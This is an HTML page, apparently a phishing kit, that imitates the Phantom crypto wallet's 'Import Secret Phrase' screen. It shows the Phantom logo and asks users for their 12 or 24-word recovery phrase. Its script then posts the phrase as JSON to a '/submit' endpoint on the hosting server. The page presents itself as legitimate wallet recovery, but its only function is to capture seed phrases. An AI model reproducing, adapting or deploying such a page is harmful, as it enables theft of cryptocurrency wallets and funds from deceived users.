<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Import Secret Phrase</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      width: 90%;
      max-width: 400px;
      padding: 20px;
      background-color: #2b2b2b;
      border-radius: 10px;
    }
    h1 {
      text-align: center;
    }
    p {
      text-align: center;
      color: #ccc;
    }
    textarea {
      width: 100%;
      height: 100px;
      border-radius: 8px;
      border: none;
      padding: 10px;
      margin-top: 10px;
      font-size: 1em;
      resize: none;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 15px;
      background-color: #8e7cc3;
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 30px;
      cursor: pointer;
    }
    .phantom-logo {
  width: 300px;
  height: auto;
  margin-bottom: 20px;
  display: block;
  margin-left: auto;
  margin-right: auto;
}
  </style>
</head>
<body>
    <img src="phantom.png" alt="Phantom Wallet Logo" class="phantom-logo">

  <div class="container">
    <h1>Secret Recovery Phrase</h1>
    <p>Restore an existing wallet with your 12 or 24-word secret recovery phrase</p>
    <form id="phraseForm">
      <textarea id="phrase" placeholder="Secret Recovery Phrase" required></textarea>
      <button type="submit">Import</button>
    </form>
  </div>

  <script>
    document.getElementById('phraseForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const phrase = document.getElementById('phrase').value;
      const response = await fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phrase })
      });
      const result = await response.text();
      alert(result);
    });
  </script>
</body>
</html>
